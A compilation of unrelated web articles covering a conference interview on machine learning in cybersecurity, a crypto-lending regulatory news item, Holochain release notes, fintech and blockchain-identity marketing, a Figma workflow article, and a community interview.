  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Donnie Wendt, Principal Security Researcher at MasterCard, will give a presentation entitled <a href="https://www.kuppingercole.com/sessions/4909/2">Machine Learning: Cybersecurity’s Friend &amp; Foe</a> on Wednesday, November 10 from 14:20 pm to 14:40 pm at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Donnie some questions about his presentation.</p>
  
 Could you give us a sneak peek into your presentation: “Machine Learning: Cybersecurity’s Friend &amp; Foe”? 
<p>Sure. My presentation, it's designed to help the cybersecurity professional understand what machine learning is and how it's used for cybersecurity. Because when you look at a lot of the marketing material for most cybersecurity products today, machine learning and artificial intelligence appear to be this magical fairy dust. But in employing machine learning for cybersecurity, it really does offer tremendous benefit and great promise. However, there are many risks that security professionals must understand.</p>
<p>So my presentation really seeks to demystify machine learning and its underlying concept so that cybersecurity professionals can harness its true potential. I'll discuss some of the possible vulnerabilities and risks, including attacks on the process, data and models, and also explore implementing adversarial machine learning to test and protect our machine learning models that we use in cybersecurity.</p>
 How can Machine Learning improve Cybersecurity? 
<p>Well, one of the challenges in cybersecurity is really dealing with the extremely high volumes of data and the rate of emerging threats out there. I've also done a lot of work in security automation and quite simply, the amount of data and the rate of attack variants make manual analysis and detection impossible, or machine learning comes in as it can effectively and efficiently deal with massive amounts of data while discovering subtle changes and patterns in that data. So employing machine learning actually offers tremendous benefits to cybersecurity.</p>
<p>It has become a very vital component in many of our security solutions. There are many cybersecurity use cases that are perfect for machine learning, including things like spam filtering, malware, phishing detection, intrusion detection, biometric authentication, user behavior analysis, anomaly detection. The list goes on. It's like almost every cybersecurity use case we have is good for machine learning. So the power of machine learning is to analyze large amounts of data efficiently and accurately ensures that its use in cybersecurity is just going to continue to expand rapidly.</p>
 What risks are there to consider? 
<p>Researchers have proven that machine learning models are vulnerable to adversarial inputs and attacks. A lot of times it will classify those attacks based on a machine learning phase, such as training or inference or based on whether they're causative or exploratory. For example, during the training phase, attacks are often what we call poisoning attacks, which can cause the models to learn the wrong behavior.</p>
<p>In the inferent stage, we look for exploratory attacks that seek to understand how our model works, which can then be a precursor to evasion or integrity attacks on our models. In addition to the attacks, we also have to understand the risks associated with bias and the inherent integrity issues within the data or the model we're using. That's why I'm a very big supporter of transparency and explicability of our machine learning models, so we do know what they're doing.</p>
 Which attacks are particularly dangerous? 
<p>Interesting, I see the most dangerous attack on machine learning is the one we don't detect, right? Because one of the leading areas in research right now is how we can detect various attacks during the phases of machine learning process. We have to understand where our weaknesses are with a given machine learning model or data. For instance, if you're doing online learning, you are more susceptible to a training phase poisoning attack because you're actually using live data to train your systems.</p>
<p>Another example is if you're using clustering algorithms for classification, you're much more susceptible to an evasion attack because it's easy to create something that looks like or looks similar to what you're clustering. So it's really, the main attack I see, the main weakness is the cybersecurity professionals not understanding necessarily how the models within the tools they're implementing work. So we really, that's why I came up with this presentation was to try to bridge that gap. It's not to make our cybersecurity professionals data scientists, but make sure they understand how these tools are leveraging machine learning.</p>

 🇺🇸 New York Attorney General Clamps Down on Unregistered Cryptoasset Lending Firms With Cease-and-desist Letters.  
 Last week the New York Attorney General, Letitia James, shared two cease-and-desist letters to cryptoasset lending firms. Under state law, such lending platforms must register with the Office of the Attorney General (OAG) if they operate from New York or offer services to its residents. These services are regulated under New York’s Martin Act which aims to protect investors when engaging with business handling securities. These letters were released to the public but were supposed to have the company names redacted. However, the file names clearly identified the two firms.<br><br>The first letter was sent to Nexo which failed to register as an issuer of securities in the state of New York. The Attorney General stated that it was ‘in possession of evidence that [Nexo] is unlawfully selling or offering for sale securities and/or commodities within or from the State of New York without having registered as required.’ The OAG’s primary concern is that New Yorkers are being exposed to ‘significant undisclosed risks’ by cryptoasset businesses. <br><br>The New York OAG outlined that Nexo has until October 28th to confirm it has ceased such activity and provide more information to the Attorney General as to why they should not investigate this matter further. In response, Nexo’s CEO Antoni Trenchev declared that the company uses IP geo-blocking to prevent New Yorkers from using their services. Nonetheless, the Attorney General urged Nexo to take all the measures needed to ‘preserve all physical and electronic record and data pertaining to the matters raised in this letter.’ This highlights the importance of establishing a strong compliance programme. A similar letter was sent to Celsius asking it to clarify its ownership structure and other operational arrangements. <br><br>In addition, three unnamed cryptoasset platforms received information request letters from the OAG relating to their operational structure, activities and products. On top of this the letter requests details of company policies which mitigate manipulative trading as well as suspicious transactions. This includes an audit of ‘all wallet addresses in which the virtual currency is held’, a list of third parties which may hold cryptoassets on behalf of these platforms and ‘a list of transactions by or through your platform or service [...] including all relevant transaction details.’ The OAG requested receipt all of this material and more by November 1st 2021.<br><br>Overall, this development shows that complex cryptoasset products are attracting increasing regulatory attention and highlights the importance of having robust compliance programmes in place to mitigate exposure to illicit activity and satisfy legal requirements. Indeed, the OAG’s press release reminded the industry of the shutdown of Coinseed and the multi-million dollar penalties imposed on Bitfinex and Tether earlier this year.

<p>Gosh, now that the dev team has moved to weekly releases, there’s a lot to catch up on when I skip a week! The most recent Holochain releases have a number of bug fixes that improve performance and reliability, along with a new feature (<code><a href="https://github.com/holochain-open-dev/wiki/wiki/How-to-use-the-%60post_commit%60-hook-in-your-zome">post_commit</a></code>) and a few breaking changes.</p> Holochain 0.0.109: Gossip improvements <p>The release from three weeks ago brought some important bug fixes in the network layer, improving performance and reliability.</p>  The conductor no longer tries to join networks that are already in the process of being joined. (<a href="https://github.com/holochain/holochain/pull/1006">#1006</a>)  The genesis process no longer tries to self-validate ops that are produced for the first three source chain entries, which may require a network which isn’t available yet. Instead, a <a href="https://docs.rs/hdk/0.0.109/hdk/prelude/genesis/index.html"><code>genesis_self_check</code></a> callback can run against those ops as a reduced, network-disabled pre-validation. (<a href="https://github.com/holochain/holochain/pull/995">#995</a>)  Multi-peer gossip messages (e.g., publishing and retrieval of DHT data) no longer wait until timeout when enough responses have been received. (<a href="https://docs.rs/hdk/0.0.110/hdk/prelude/genesis/index.html">#1009</a>)  Terminate a gossip round initiation if no responses are received. (<a href="https://github.com/holochain/holochain/pull/1014">#1014</a>)  Don’t gossip with stale peers. This fixes a bug with long-lived DHTs, in which newcomers couldn’t see old data. The bug had previously been blocking a number of initiatives, including the <a href="https://github.com/holochain/launcher/">Holochain Launcher</a> and <a href="https://holochain.org/dev-camp/">DevCamp</a>. (<a href="https://github.com/holochain/holochain/pull/1014">#1014</a>)  <p>There have been some other speed improvements and fixes:</p>  The conductor can now run 50 validations concurrently. This helps speed things up when some validations are slowed down waiting to retrieve DHT data. (<a href="https://github.com/holochain/holochain/pull/1005">#1005</a>).  Commits to the source chain with the new <code>ChainTopOrdering::Relaxed</code> flag now store both header and entry; previously the entry was mistakenly being dropped.  <p><a href="https://github.com/holochain/holochain/blob/develop/CHANGELOG.md#holochain-00109">Read the full changelog</a>.</p> Holochain 0.0.110: More gossip improvements <p>The release from two weeks ago brought more networking bug fixes, which have made gossip even more reliable.</p>  Agents now try to republish their authored source chain data until they receive the expected number of validation receipts. This helps ensure the data will stay available when the agent goes offline. (<a href="https://github.com/holochain/holochain/pull/1024">#1024</a>)  Improvement to database write efficiency when storing information about peers. (<a href="https://github.com/holochain/holochain/pull/1007/">#1007</a>)  DHT requests are only sent to local agents if they’re authorities. This saves on internal chatter. (<a href="https://github.com/holochain/holochain/pull/1027">#1027</a>)  ‘starts-with’ queries on link tags now work. This was working in the LMDB storage layer but not in the SQLite storage layer. (<a href="https://github.com/holochain/holochain/pull/1027">#1027</a>)  <p>Lair, the keystore for Holochain, is also undergoing <a href="https://github.com/holochain/lair/pulls?q=is%3Apr+is%3Aclosed">a lot of changes</a>. There’s been a lot of work to get Holochain ready for Lair’s new API (<a href="https://github.com/holochain/holochain/pull/1017">#1017</a>), but your hApps won’t be affected by these changes. It does mean, though, that Lair and Holochain will be getting new features, including:</p>  Seed bundle importing will allow you to use <a href="https://github.com/holochain/deepkey/">DeepKey</a> to create an identity and one machine and connect it to your identity on another machine (Lair <a href="https://github.com/holochain/lair/pull/70">#70</a>).  NaCl’s <a href="http://nacl.cr.yp.to/box.html">box encryption</a> algorithm will be added to the HDK in addition to the <a href="https://docs.rs/hdk/0.0.110/hdk/x_salsa20_poly1305/index.html">existing</a> secret box encryption (Lair <a href="https://github.com/holochain/lair/pull/73">#73</a>).  <p>If you manage conductor configs yourself, you’ll need to know that the Lair keystore config section has some breaking changes (<a href="https://github.com/holochain/holochain/pull/1031">#1031</a>) as a result of the above.</p><p>Sweettest has also gotten some updates that make it more versatile (<a href="https://github.com/holochain/holochain/pull/1030">#1030</a>). Not sure what Sweeettest is? Read on; I’ve written a bit about it after the next section.</p><p><a href="https://github.com/holochain/holochain/blob/develop/CHANGELOG.md#holochain-00110">Read the full changelog</a>.</p> Holochain 0.0.112: Post-commit hook and DNA info <p>Last week’s release brings new developer-facing features and breaking changes. (Note that there is no official 0.0.111 because of a release automation issue.)</p><blockquote>The biggest new feature is the <code>post_commit</code> hook. This lets you write a callback that’s called after every zome call that commits data. Your callback will receive a list of headers that have just been written, and can then do whatever it likes except commit new data. (<a href="https://github.com/holochain/holochain/pull/1000">#1000</a>)</blockquote><blockquote>Read more about <a href="https://github.com/holochain-open-dev/wiki/wiki/How-to-use-the-%60post_commit%60-hook-in-your-zome">how to use <code>post_commit</code></a> in your hApp at the community wiki.</blockquote><p>Breaking/new: Some info available via the <code><a href="https://docs.rs/hdk/0.0.112/hdk/info/fn.zome_info.html">zome_info</a></code> host function -- the DNA ID, hash, and properties — have been split out into a new <code><a href="https://docs.rs/hdk/0.0.112/hdk/info/fn.dna_info.html">dna_info</a></code> host function. This information is no longer available via <code>zome_info</code>, and the <code>zome_name</code> property has been renamed to <code>name</code>. (<a href="https://github.com/holochain/holochain/pull/1044">#1044</a>) Additionally, a DNA’s zomes are now available via <code>dna_info</code> (<a href="https://github.com/holochain/holochain/pull/1052">#1052</a>) and a zome’s entry type definitions are now available via <code>zome_info</code> (<a href="https://github.com/holochain/holochain/pull/1055">#1055</a>).</p><p>Breaking: The structs <code>HeaderHashes</code> and <code>HeaderHashedVec</code>, which wrap vectors of other structs, have been removed. As this was only used in the previously unimplemented <code>post_commit</code>, it shouldn’t affect any of your existing code. (<a href="https://github.com/holochain/holochain/pull/1049">#1049</a>)</p><p>New: <code>call_info</code> is partially implemented. A zome call can use this function to get info about how and why it was called. Currently it only gives the current source chain head, but in the future it will give information about capability context and how it was called (by a client, another zome or DNA, or a remote agent). (<a href="https://github.com/holochain/holochain/pull/1047">#1047</a>)</p><p><a href="https://github.com/holochain/holochain/blob/holochain-0.0.112/CHANGELOG.md#20211021140006">Read the full changelog</a>.</p> Sweettest: Rust-based Holochain testing <p>Sweettest is a Rust-based testing framework for Holochain apps. It has tools for creating conductors, loading hApps into them, and networking those conductors together. The Holochain dev team created it for testing Holochain and its various subsystems in different scenarios. And because it’s written in Rust, they can test everything from within one language ecosystem with simpler tools for automation and continuous integration. Besides the convenience of putting tests inline with code, they can reuse all of Holochain’s public-facing types like HDK and conductor API input/output structs. There’s no need to recreate a bunch of type definitions in TypeScript or depend on JavaScript client bindings.</p><p>Right now the Holochain team’s big focus is on testing sharding and scaling. They need rigorous sharding tests that ensure everything is successfully getting validated by the right DHT peers, no signals or messages are getting lost, and there are no bottlenecks. On top of sharding, they’re also testing how Holochain performs in large networks with lots of traffic, with an eye to analyzing what disruptions it’s encountering when it does struggle. This will become very important in the near future, because we’re just about to open up public access to hosted apps like Elemental Chat. If we can gather good data that pinpoints the source of problems, that helps us find solutions quickly.</p><p>From what I understand, they use Sweettest to run both small-scale <a href="https://en.wikipedia.org/wiki/Unit_testing">unit tests</a> and large-scale integration tests. Because Holochain is a framework for peer-to-peer computing, it becomes important to test the same chunk of code in multiple contexts, such as on different machines as they interact with each other.</p><p>Although its primary usage right now is testing Holochain, Sweettest can also be used as an alternative to Tryorama for testing hApps. That’s because the Holochain conductor is basically a runtime for hApps — much of the functionality can’t be tested without an actual hApp to plug into it. In fact, a lot of our Sweettest tests are built around hApp functionality.</p><blockquote><a href="https://github.com/holochain/tryorama">Tryorama</a>, the Node.JS-based Holochain scenario testing suite, is still our ‘official’ way of creating scenario tests for developers to test their hApps. But if you want to try something different — and don’t mind a bit of do-it-yourself — Sweettest might be worth a try.</blockquote><p>All of our <a href="https://github.com/holochain/holochain/tree/develop/crates/holochain/tests">examples</a> are specific to testing Holochain, of course, and some of them use zomes generated on the fly rather than compiled into a DNA. But they do show how to <a href="https://github.com/holochain/holochain/blob/develop/crates/holochain/tests/multi_conductor.rs">construct multi-conductor scenarios</a> and <a href="https://github.com/holochain/holochain/blob/develop/crates/holochain/tests/agent_scaling.rs">test time-to-consistency</a>, and even <a href="https://github.com/holochain/elemental-chat/pull/100/files#diff-bea9f70b22dade9abf9f6a3e7ac3c9c6d34fa336a214077a98761ea757cac7fbR1-R174">test a hApp</a>. Hopefully they’ll give you a decent idea of how to create your own scenario tests.</p> DevCamp 8 <p>How it started: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;How it’s going:</p><p>😃😃😃😃😃😃😃😃😃😃😃 &nbsp; &nbsp; &nbsp; &nbsp;👩‍🏫🤯😤😊😎🤔🤓💪👍👨‍💻👩‍💻</p><p>Seriously, the level of excitement, thoughtfulness, and engagement has been wonderful to watch — and it’s remained high through the first three weeks of DevCamp and this week’s ‘reading break’.</p> Holochain In Action: Mapping important modules <p>The most recent Holochain in Action session explores the current landscape of modules you can use in your hApps already, along with the unknown territory at the edge of the map. Where are the gaps? What modules do we need to build next? How can we make sure we create things that will <a href="https://blog.holochain.org/holochain-v0-0-107-a-release-to-build-on/#holochain-in-action-composability-in-the-real-world">compose</a> together well? (This is an important subject; composable modules are easier to work with, which means that more people can build better apps. We’ve touched on this in our <a href="https://blog.holochain.org/holochain-v0-0-107-a-release-to-build-on/#holochain-in-action-composability-in-the-real-world">coverage</a> of a previous HIA session.)</p><p>One thing I really loved about this session is that the participants used <a href="https://github.com/h-be/acorn">Acorn</a>, a Holochain app, to do their mapping. You can see their excitement as they all connect to each other, peer-to-peer, and start working together. Hooray for <a href="https://en.wikipedia.org/wiki/Eating_your_own_dog_food">dogfooding</a>!</p><p>Cover photo by<a href="https://unsplash.com/@zhangkaiyv?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"> zhang kaiyv</a> on<a href="https://unsplash.com/s/photos/highway?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"> Unsplash</a></p>

<p>Not every customer who walks through the door of your dealership on a sunny weekend afternoon can breeze through the auto financing process with no issues. This group could comprise as much as <a href="https://www.experian.com/blogs/ask-experian/research/auto-loan-debt-study/">18% of the borrowers </a>who step into your dealership. In our quickly-evolving economy, many borrowers can have multiple sources of income, thin credit, or a compromised FICO profile. Verifying income with consumer-permissioned data is a digital solution that can help clear stips and smooth out those tricky loan approvals in real-time.</p>
<p>If you have a borrower sitting in your financing department, the team at your dealership has already invested time with them. They’ve shown them several vehicles, developed rapport, and maybe took a test drive. Don’t lose the sale just because the customer isn’t carrying a stack of freshly-printed pay stubs. Using Finicity Lend’s income verification, the borrower permissions access to the data in their bank account, generating a verification of income (VOI) report. The results that are returned show a high level of accuracy in determining actual income. This <a href="http://finicity.com/connect">low-friction experience</a> cuts down total time spent on each loan application, finishing the verification process in real-time. The borrower doesn’t have to scramble to collect documentation from various sources just so they can leave with the car.&nbsp;</p>
 Extend Credit With Confidence. Get More Approvals. 
<p>Tightened auto lending guidelines and a pandemic-influenced drop in consumer demand are causing <a href="https://newsroom.transunion.com/consumer-credit-activity-continues-to-rise-from-pandemic-lows--auto-loan-subprime-performance-lags/">a slump in subprime originations</a>. When your customer falls in love with a car and is ready to buy, you don’t want limited lending options to cost you the sale. Traditional FICO models are a good start, but when credit scores aren’t enough to get the green light, Finicity Lend augments the credit decisioning with real-time income data that makes the credit decisioning process faster and more efficient for lenders.&nbsp;</p>
<p>Today’s lending process is in the midst of a vast digital transformation, placing Finicity, a Mastercard company and its open banking technology at the forefront of this data revolution. <a href="https://www.experian.com/blogs/ask-experian/what-is-a-thin-credit-file-and-how-will-it-impact-your-life/">62 million Americans have a thin credit file</a>, with only one to four tradelines listed. While they may be more than capable of financing a car, traditional credit scoring models could result in a denial of these applications. With Finicity Lend’s income verification, permissioned data access to their bank accounts gives a more robust picture of their actual financial health. The borrower can be issued a loan that they can be approved for and repay. Finicity’s open banking network covers 95% of direct deposit accounts in the United States, greatly increasing the number of buyers you can assist in buying a car. Accurate income data helps satisfy loan stipulations and lets buyers purchase a vehicle right away.&nbsp;</p>
 Reducing Risk 
<p>When a borrower misrepresents their income, it’s nearly always to gain access to more credit than they can handle. 2020 was a <a href="https://www.businesswire.com/news/home/20210415005688/en/Landmark-Point-Predictive-Fraud-Study-Details-Record-Year-for-Auto-Loan-Fraud-in-2020">record year</a> for fraud in the auto industry, reaching a whopping $7.3 billion in losses. One of the biggest increases came in income and employment misrepresentation. With a 100% year-over-year jump in falsified incomes, one of the most important investments you can make is in prevention. Be sure that you have accurate data with Finicity Lend’s income verification.&nbsp;</p>
 Higher Verification Success Rates Translates to Fewer Lost Sales 
<p>With the increased confidence and efficiency that comes with Finicity Lend’s income verification, good sales don’t walk out the door just because there’s not enough paperwork on hand. Verified, real-time data gets the sale closed. Over the course of a fiscal year, lost sales and fraud can cause extensive damage to your bottom line. Finicity income verification is fast and secure.

<p>Like many design teams, <a href="https://onfido.com/">Onfido</a> made the transition from Abstract + Sketch, to Figma in the last couple of years. One of the common resistance points internally before making that switch, was Figma’s lack of Git-style branching that Abstract enabled. The design team had come to rely on branching and had built a lot of our processes around&nbsp;it.</p><p>During the transition we tried to structure our files, projects, and design system in a way that would help maintain some (though not all) of the benefits we got from branches.</p><p>I hope some of the ideas here spark inspiration for ways you could improve your project and file structures, however keep in mind that this system was designed for our specific needs (yours are probably different) and that these decisions should change over time in a culture of continuous improvement. I highlight some of our learnings at the end of the article. As always, your mileage may&nbsp;vary!</p> Structure <p>We are on a <a href="https://www.figma.com/pricing/">Figma Organisation plan</a>, and structure our teams in a way that roughly maps to our cross-functional product&nbsp;teams.</p><p>Each team has three main types of “projects” (folders, if you&nbsp;prefer):</p>  Source files  Work in progress&nbsp;(WIP)  Archive   Source files <p>A source file is like our main branch. They are one or more files that contain a reasonably up to date version of each screen in the product, and typically not a lot more. We try to keep these files as slim as possible, with as little screen duplication as possible. We do this to reduce the impact of breaking changes further down the road, and to simplify manual effort when&nbsp;merging.</p><p>The rule of thumb is that if someone can look at a screen in the live product, and put together an accurate version of that screen in Figma in under 2 mins, then what’s in the source file is enough. We don’t need an exhaustive lists of all the error states for a form, as long as there’s one solid example of what an error looks&nbsp;like.</p><p>These files are often the starting point for design work on existing products. Streamlined source files enable us to quickly duplicate flows and have them be immediately useful without a lot of busy work removing edge and error&nbsp;cases.</p> Work in&nbsp;progress <p>This is usually where the Figma part of the design process starts. We have a project template file which specifies a basic page structure, and a standardised cover sheet. This will be copied into the work in progress folder and named with the project name, and JIRA ticket number where applicable.</p><p>This file acts as our branch. Branching is unfortunately very manual right now, but not too difficult at our scale of two to three designers per&nbsp;product.</p><p>Screens are copied from the source file (which should be up to date), and design exploration is done from there. Our template specifies an Exploration page, which carries the expectation of no pre-defined structure, as messy and exploratory as the designer wants to be. We don’t critique people’s exploration pages.</p><p>We also specify a Handoff page, where engineers know to look for final screens, design specs and flows. Redlines (using <a href="https://www.figma.com/community/plugin/739918456607459153">Figma Measure</a>), and custom annotation components are commonly used&nbsp;here.</p><p>Between those two pages, the designer can add as many pages as they need. Typically these progress in order, and new pages are often created at points where feedback is required. We’ll limit pages to only the stuff we want feedback on, so design dead ends and exploratory screens don’t distract people away from what you need actual feedback&nbsp;on.</p> UI kits <p>In our design system team we have a UI Kits project. These UI kits contain any commonly used UI components that are more product-specific than our Design System supports. Each product has a UI kit that’s owned and managed by that product&nbsp;team.</p><p>A note on naming: You’ll see the UI kits have an 05 in front of their name. This is part of our design system’s naming convention that I’ll dig deeper in with another article. We use this numbering system throughout our files to keep libraries in a consistent order in the library panel. Themes first, then assets, components, patterns, and UI&nbsp;kits.</p><p>When it comes to how we structure our files, one of our few hard rules&nbsp;is:</p><blockquote>WIP and Source files should not contain any local components</blockquote><p>The reasons we do this are&nbsp;to:</p>  Reduce library management noise<br>If every WIP or Source file is published as a team library, trying to find the right libraries to enable/disable to get a particular version of a particular component becomes a nightmare very&nbsp;quickly.  Make all screens easily portable/reusable by designers<br>If local components are in a file, but aren’t published as a team library, when someone copies a screen to another file, all links to that main component are lost. The result is an orphaned instance that doesn’t update when the main component is updated because changes aren’t published &amp; pushed. This is totally invisible to the designer, as it visually appears like a standard instance.  Unpublished local components lead to broken instance&nbsp;linksHaving a single published team library allows screens to be easily&nbsp;portable Merging <p>Once a design has been approved and development is in progress or completed, the new screens will be copied back to the Source file, replacing existing screens where necessary. Because no published components exist here, screens can be replaced safely without worry of affecting other work in progress.</p><p>For changes in UI kits, components will often be labelled as [BETA] while in progress, or given a version number, or something similar that lets us manage multiple versions of a component existing simultaneously while the work is in progress. When the screens are merged and we want to clean up those UI kit duplicates, we will follow the process here: <a href="https://medium.com/onfido-tech/how-to-deprecate-old-components-in-figma-design-systems-7978ea8e045e">How to deprecate old components in Figma design&nbsp;systems</a>.</p> Archiving <p>Once complete, the work in progress file has the cover status changed to Archived and it is moved to the Archive folder. The archive then acts as an easy way to see the process behind a piece of work, the comment discussions, and document experiments and directions that could potentially be drawn on&nbsp;later.</p> Things we’ve learned so&nbsp;far   Cover status badges are a huge pain to maintain and keep up to date. No one remembers to change them to the right status, so they’re effectively useless. Occasionally we’ll do a big batch-change of everything in the Archive folder, as having these visibly well marked is really beneficial for searches. Some kind of background API integration that synced files with JIRA in real-time would be amazing here.&nbsp;*dreams*  There can be some confusion around what the right level of detail is to keep in a source file. We suggest keeping an open mind, and working with your teams to find the right balance for each team, as their products may have different needs.  Figma’s new Branches feature does not really meet our needs as it is currently designed. Once merged, the process part is a lot more hidden and difficult for others to find than our archived files. That archival side may not be an issue for you, which is fine. The other issue is that our styles and components live in separate libraries. If we need to make a change that includes both a style and component change, that can‘t be done in a single branch. There’s also no good way of testing the effect your branch changes will have on linked instances in other files right now. Again, a multi-file branch system would solve&nbsp;these.  Having a JIRA ticket number in file names is really useful for search, however search only returns results from teams you are a member of, making cross-team discoverability a lot worse than it should be. This is especially true for larger orgs with more teams, or stricter permissions than we have (anyone is free to join any team at&nbsp;Onfido).  <p>I hope that’s sparked some ideas about how you could structure your own teams and files.

 This is an ongoing series featuring Ontology’s Harbingers. Harbingers are exceptional leaders that help Ontology grow its community and ecosystem, making it an ever-stronger blockchain, and decentralized identity and data&nbsp;leader. <p>In the ninth interview in this series, Ontology speaks with <a href="https://twitter.com/ButNeverSaved">John Francisco</a>, administrator of our <a href="https://t.me/OntologySpanish">Spanish community</a>.</p> 1. How did you hear about Ontology? What drew you to Ontology? <p>I heard about Ontology when I met Sesameseed. They had recently launched staking with Ontology. I really liked their ecosystem and started to learn more about the&nbsp;project.</p> 2. What made you become a supporter of Ontology and a champion of its&nbsp;brand? <p>As an end user in my beginnings knowing Ontology, I was very fascinated by its infrastructure and its staking. I later learned that it is aiming to provide digital identity solutions that companies and day-to-day users need, today. I like technology, therefore, this led me to become even more interested in Ontology.</p> 3. What do you see as the key role of a Harbinger? What is your favorite thing about being a Harbinger? <p>The community is very important in every project. For this reason, building communities and giving them the tools they need to understand the project is vital for the future and its success. Being a Harbinger is having the responsibility of spreading the word about the future, leading new generations to contribute and generate change in all aspects of technology, and that is what Ontology does, day after&nbsp;day.</p> 4. Why is being part of the Ontology community important to&nbsp;you? <p>As I have mentioned before, the community is very important; it is the heart of every project. It is the starting point because they direct the course of the project anyway; they help to build a better future. For that and many more reasons, being part of Ontology is being that new paradigm of improvements towards the&nbsp;future.</p> 5. How is Ontology’s community different from other blockchain communities, is there anything that makes it stand&nbsp;out? <p>Each community has its own, however Ontology allows all its members to be part of the project in a more direct way, such as via the Ontology Harbinger program. This program is where you can contribute your knowledge about Ontology’s technology and long-term objectives more directly. Ontology makes you special by being part of its community, part of its ecosystem and as an end user you feel that you have done something important for today and the future of Ontology.</p> 6. What do you use as your key channels for engagement with the Ontology community and why? Would you like to see any&nbsp;others? <p>Telegram is a very important channel for Ontology; it is the place where the community feels welcomed by the moderators and administrators. There is a more direct interaction and it is the perfect place to disseminate what Ontology is. As a secondary channel, Twitter is an essential part of the communication ecosystem because it interacts with the most technical and intrepid users who also contribute as the Ontology community.</p> 7. Can you share a memorable experience or something you’ve learned from being a Harbinger? What advice would you give to someone looking to become a Harbinger? <p>In the first instance it was an arduous path, but I did it. Now my responsibilities do not merely include being a single guide to a member of the community but also being an ambassador for Ontology anywhere and for everyone. To be a Harbinger, my biggest advice is, be part of Ontology, understand Ontology and be more than a community member. Understand Ontology’s potential and how you can contribute to the project in a healthy way. Learn every day from Ontology because technology advances every day and without stopping.</p> 8. How would you describe the Ontology community in three&nbsp;words? <p>Amazing, fascinating, visionaries.</p> 9. How do you think Ontology could expand its community going forward? What would you like to see more/less of? What kinds of things do you see community members do that you think help our community grow? <p>Communication is vital for a community to grow and prosper. Ontology and the Harbinger program open the doors for the community to grow and have solid foundations for its expansion to other horizons.</p><p>The members of the community are the visionaries and owners of having the project in their hands, with their contribution, their knowledge, their way of understanding Ontology leaving an enriched legacy of pure knowledge, they make and will make Ontology and its community even stronger in&nbsp;time.</p> 10. What do you see as the key milestones for Ontology and how can the community help with achieving these? <p>Its decentralized identity solutions that return to the end user control over their data. It is important that community members utilize these tools and be an example to others who may later come to adopt them, too. We need to demonstrate to those around us how Ontology’s tools benefit our everyday lives. We can use ONTO to manage our digital identities or build wealth through staking and show our friends and family how convenient and easy it&nbsp;is.</p><p>To learn more about Ontology’s Harbinger Program and how you can get involved, check out our updated&nbsp;<a href="https://medium.com/ontologynetwork/learn-what-it-takes-to-become-the-next-ontology-harbinger-8c55c49dc856">GUIDE</a>.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

			 Guarantee Asset Ownership with Blockchain Passports 
<p>In the DeFi world, digital assets are stored in blockchain wallets. Obviously, wallets are not identities, they are anonymous addresses and contain no data on the owner’s identity. A private key is the ‘password’ of the wallet, whoever knows it can access the wallet. It cannot be changed, but it can be stolen. In other words,&nbsp;a wallet is more like a browser for blockchain, where you can see what is inside, but you cannot be sure that you are the only one that has access to your assets.&nbsp;This causes a number of issues:</p>
 
 Lack of ownership guarantee:&nbsp;If the private key of the wallet is accessible by another user, then who owns the assets?&nbsp;<br>
 
 Lack of compliance:&nbsp;For token issuers or DeFi protocols, it is impossible to comply with regulations if the owner of the digital asset is unidentifiable and eligibility criteria cannot be enforced.&nbsp;&nbsp;<br>
 
 
<p>So, what is the solution? Digital identities. Just as our assets are secured by tying our identity to them in the real world,&nbsp;digital identities can serve as blockchain passports in the DeFi world to guarantee the ownership of digital assets.&nbsp;</p>
<p>Here is how it works:</p>
 
 Link digital identity to tokens:&nbsp;Use a token standard that codes ownership of tokens with a digital identity into the token, such as&nbsp;<a href="https://tokeny.com/erc3643-an-official-standard-for-permissioned-tokens/?utm_campaign=Insights&amp;utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz-8CICjIIuDtTtwwrilIOs32jMUt8WvZHzkBCGzD6Fq2JW_uP4pcxEcwOeQ-xfJF4N4CT92b">ERC3643</a>, the official permissioned token standard. With this standard, token recovery is even possible due to the use of&nbsp;<a href="https://www.onchainid.com/?utm_campaign=Insights&amp;utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz-8CICjIIuDtTtwwrilIOs32jMUt8WvZHzkBCGzD6Fq2JW_uP4pcxEcwOeQ-xfJF4N4CT92b">ONCHAINID</a>, a decentralized digital identity system. 
 A functional blockchain passport:&nbsp;Once the tokens are issued, they will be allocated to a wallet associated with the digital identity. Furthermore, digital identity functions go far beyond this, and can allow you to recover/transfer tokens, add/delete wallets (e.g. Metamask, Ledger), etc. 
 
<p>More interestingly, when personal data (e.g. country of residence, age…) is verified by trusted parties (e.g. government, big four, KYC providers…), the proof of the verification is stored onchain in the digital identity, making these proofs reusable. For instance, identity owners can grant access to their proof of age to a DeFi protocol that only accepts users above the age of 18.</p>
<p></p>
<p>Without revealing their personal information, the DeFi protocol can determine if the identity holders are over 18 years old via the verified proof.&nbsp;Digital identity is thus like a privacy-protected blockchain passport, making it easier, safer and faster to explore DeFi.</p>

<p>An important change is beginning to sweep the world of personal data. For many years, people have debated the question ‘what if individuals — e.g. citizens, customers — were able to assert genuine control over their own&nbsp;data?’</p><p>Now the debate is moving on to how to make this happen, at&nbsp;scale.</p><p>Look at some recent developments. In recent&nbsp;weeks:</p>  The UK Government’s proposed <a href="https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/1016395/Data_Reform_Consultation_Document__Accessible_.pdf">legislation to reform UK data protection laws</a>, includes (amongst many less positive things) new provisions for data intermediaries including for “Personal information management systems, which seek to give data subjects more control over their personal&nbsp;data.”  The UK Department of Culture Media and Sport’s latest <a href="https://www.gov.uk/government/publications/uk-digital-identity-attributes-trust-framework-updated-version">paper</a> on its new National Identity and Attributes Trust framework specifically mentions citizens being able to hold verified attributes in their own personal data&nbsp;stores.  The Scottish Government’s proposed <a href="https://digitalscot.net/courses/digital-government/lessons/digital-identity/topic/digital-identity-scotland-scottish-attribute-provider-service/">Scottish Attribute Provider Service</a> includes a provision “where people can choose to save their personal information securely to an individual ‘locker’ (a digital attribute store), in order to reuse when they wish to apply to other services”.  